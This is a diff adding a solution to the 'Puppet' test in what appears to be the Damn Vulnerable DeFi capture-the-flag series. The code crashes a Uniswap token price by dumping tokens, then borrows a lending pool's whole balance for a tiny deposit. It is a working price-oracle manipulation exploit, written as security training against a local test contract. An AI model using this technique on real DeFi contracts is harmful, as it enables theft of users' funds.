@@ -103,6 +103,56 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        let provider = ethers.provider
+
+        function formatOutput(val){
+            return parseFloat(ethers.utils.formatEther(val)).toFixed(3)
+        }
+
+        async function logData() {
+
+            let row1 = {
+                "pool DVT": formatOutput(await this.token.balanceOf(this.lendingPool.address)),
+                "pool ETH": formatOutput(await provider.getBalance(this.lendingPool.address)),
+                "attacker DVT": formatOutput(await this.token.balanceOf(attacker.address)),
+                "attacker ETH": formatOutput(await provider.getBalance(attacker.address)),
+                "exchange DVT": formatOutput(await this.token.balanceOf(this.uniswapExchange.address)),
+                "exchange ETH": formatOutput(await provider.getBalance(this.uniswapExchange.address))
+            }
+
+            let depositRequired = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
+            console.table([row1])
+            console.log(`[+] Deposit required to borrow ${formatOutput(POOL_INITIAL_TOKEN_BALANCE)} DVT: ${formatOutput(depositRequired)} ETH\n`)
+        }
+
+        let tokenAmount = ethers.utils.parseEther('999.99');
+
+        await logData.call(this);
+
+        let p = await this.uniswapExchange.getEthToTokenInputPrice(tokenAmount, { gasLimit: 1e6 });
+        console.log(`[+] Swapping ${formatOutput(tokenAmount)} DVT. Expecting to receive: ${formatOutput(p)} ETH`)
+        
+        await this.token.connect(attacker).approve(this.uniswapExchange.address, tokenAmount)
+
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
+            tokenAmount,
+            1,
+            (await provider.getBlock('latest')).timestamp * 2
+        );
+
+
+        let depositRequired = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
+
+        await logData.call(this);
+
+        console.log(`[+] Borrowed ${formatOutput(POOL_INITIAL_TOKEN_BALANCE)} DVT`)
+
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, {
+            value: depositRequired
+        })
+
+        await logData.call(this);
     });
 
     after(async function () {
